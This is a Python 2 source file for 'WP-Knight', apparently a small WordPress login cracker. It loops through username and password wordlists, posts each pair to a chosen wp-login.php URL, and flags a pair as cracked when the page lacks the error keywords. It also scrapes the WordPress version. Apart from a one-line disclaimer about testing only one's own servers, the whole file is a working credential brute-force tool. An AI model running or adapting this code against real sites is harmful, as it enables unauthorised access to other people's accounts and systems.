
# WordPress Cracker 6/19/2018
# Coded by Pythogen

# Intended for personal security testing. Please do not use on servers you don't own.
# WP-Knight was created as a mini alternative to WPScan.

# (6/19/2018) - Basic cracker function complete. Works perfectly on any WordPress target. New features will be added soon.

import sys
import requests

print """

	 _  _  _ ______       _     _       _       _          
	(_)(_)(_|_____ \     (_)   | |     (_)     | |     _   
	 _  _  _ _____) )____ _____| |____  _  ____| |__ _| |_ 
	| || || |  ____(_____)  _   _)  _ \| |/ _  |  _ (_   _)
	| || || | |          | |  \ \| | | | ( (_| | | | || |_ 
	 \_____/|_|          |_|   \_)_| |_|_|\___ |_| |_| \__)
	                                     (_____|           
	 Coded by Pythogen (WordPress 4.9.6+)

"""

# Default login URL (Use 'url' command to set your target)
login_URL = "http://127.0.0.1/wp/wordpress/wp-login.php"
# Detecting incorrect password
keyword = "incorrect"
# Detecting invalid username
keyword2 = "Invalid"
# Detecting empty field
keyword3 = "empty"

uname = 'a'
pwd = 'a'
inc = 0
aPlace = 0
bPlace = 3

def console():
	while(True):
		cmd = raw_input(" Enter command> ")
		if cmd == "help" or cmd == "?":
			print """\n Commands:
	url - Set login URL ([website]/wp/wordpress/wp-login.php)
	version - Check WordPress version
	go - Activate WP-Knight
	exit - Exit WP-Knight
			"""
		elif cmd == "exit":
			sys.exit()
		elif cmd == "go":
			print "\n WP-Knight Activated! \n"
			bruteforce()
		elif cmd == "url":
			url_config()
		elif cmd == "version":
			versionCheck()
		else:
			print "\n Invalid Command\n"

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def url_config():
	global login_URL
	global host
	global redirect
	login_URL = raw_input("\n Enter target URL: ")
	host = find_between(login_URL,"//","/")
	redirect = 'http://%s/wp/wordpress/wp-admin/' % (host)
	print ""

def versionCheck():
	global login_URL
	headers = {'Accept-Encoding': 'identity'}
	r = requests.get(login_URL, headers='')
	a = find_between(r.text,"ver=","'")
	print "\n WordPress version: %s\n" % (a)

def bruteforce():
	global aPlace
	global bPlace
	global keyword
	global host
	global redirect
	global login_URL

	text_file = open("list.txt", "r")
	text_file2 = open("pw.txt", "r")

	with requests.Session() as c:
	
		# Username List 
		USERNAME = text_file.read().split('\n')
		# Password List
		PASSWORD = text_file2.read().split('\n')

		# Username cycle
		for u in USERNAME:
			# Password cycle (Only first three words)
			#for p in PASSWORD[aPlace:bPlace]:
			for p in PASSWORD:
				# Print process
				uname = u
				pwd = p
				print ' %s:%s' % (u,p)

				# 1) Direct to login url. Prepare for POST login
				c.get(login_URL)

				#POST Login data
				login_data = \
				{
					'log': uname,
					'pwd': pwd,
					'wp-submit': 'Log In',
					'redirect_to': redirect,
					'testcookie': '1'
				}

				#Header data
				header_data = \
				{
				}

				# 2) Submit POST data. Initialize login
				bruteforce.page = c.post(login_URL, data=login_data, headers=header_data)

				# 4) Looking for keyword indicating successful login
				Check = bruteforce.page.content.find(keyword)
				Check2 = bruteforce.page.content.find(keyword2)
				Check3 = bruteforce.page.content.find(keyword3)

				# Check = incorrect , Check2 = invalid
				# If 'incorrect' and 'invalid' not found, then you've cracked the password.
				if Check == -1 and Check2 == -1 and Check3 == -1:
					print "\n Cracked: %s:%s \n" % (u,p)
					return
				# Otherwise, continue..
				else:
					pass

		text_file.close()
		text_file2.close()
		#aPlace = aPlace + 3
		#bPlace = bPlace + 3
		print ""


# Set request header details:
host = find_between(login_URL,"//","/")
redirect = 'http://%s/wp/wordpress/wp-admin/' % (host)

console()